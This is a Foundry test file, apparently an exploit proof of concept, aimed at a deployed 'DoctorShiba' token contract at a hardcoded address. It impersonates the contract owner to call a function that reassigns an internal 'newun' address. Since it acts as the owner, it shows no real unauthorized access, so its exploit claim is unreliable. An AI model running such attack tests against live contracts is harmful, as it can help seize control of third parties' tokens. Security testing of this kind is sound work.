// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface DoctorShiba {
    function owner() external view returns (address);
    function transfernewun(address _newun) external;
    function newun() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE;
    address attacker = address(this);
    DoctorShiba ds;
    address victim;


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        ds = DoctorShiba(TARGET);
        vm.label(TARGET, "DoctorShiba Token");
        victim = address(0x1337);
        vm.label(victim, "Victim");
        deal(TARGET, victim, 1000 * 1e9);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        address owner = ds.owner();
        vm.startPrank(owner);
        ds.transfernewun(victim);
        vm.stopPrank();
        address newun = ds.newun();
        assertGt(uint160(newun), 0, "newun should not be zero address");
        assertTrue(newun != address(0), "Logic Exploit Failed: Value unchanged");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
